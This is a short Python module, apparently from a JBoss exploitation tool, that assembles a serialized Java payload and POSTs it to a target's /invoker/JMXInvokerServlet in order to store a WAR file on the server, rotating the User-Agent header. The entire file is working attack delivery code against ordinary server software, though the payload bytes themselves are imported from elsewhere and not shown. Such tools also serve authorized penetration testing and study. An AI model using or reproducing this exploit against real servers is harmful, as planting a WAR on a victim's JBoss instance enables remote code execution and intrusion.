from src.payloads.exploit_jmx_invoker_file_repository import PAYLOAD_1__exploit_jmx_invoker_file_repository, \
    PAYLOAD_2__exploit_jmx_invoker_file_repository, PAYLOAD_3__exploit_jmx_invoker_file_repository, \
    PAYLOAD_4__exploit_jmx_invoker_file_repository
from src.utils.misc import get_random_user_agent


def exploit_jmx_invoker_file_repository(url: str, version: int) -> None:
    """
    Exploits JMXInvokerServlet to store a WAR in JBoss, no return value.
    """
    payload = PAYLOAD_1__exploit_jmx_invoker_file_repository
    payload += (
        PAYLOAD_2__exploit_jmx_invoker_file_repository
        if version == 0
        else PAYLOAD_3__exploit_jmx_invoker_file_repository
    )
    payload += PAYLOAD_4__exploit_jmx_invoker_file_repository
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/x-java-serialized-object",
    }
    gl_http_pool.request("POST", f"{url}/invoker/JMXInvokerServlet",
                         headers=headers, body=payload)
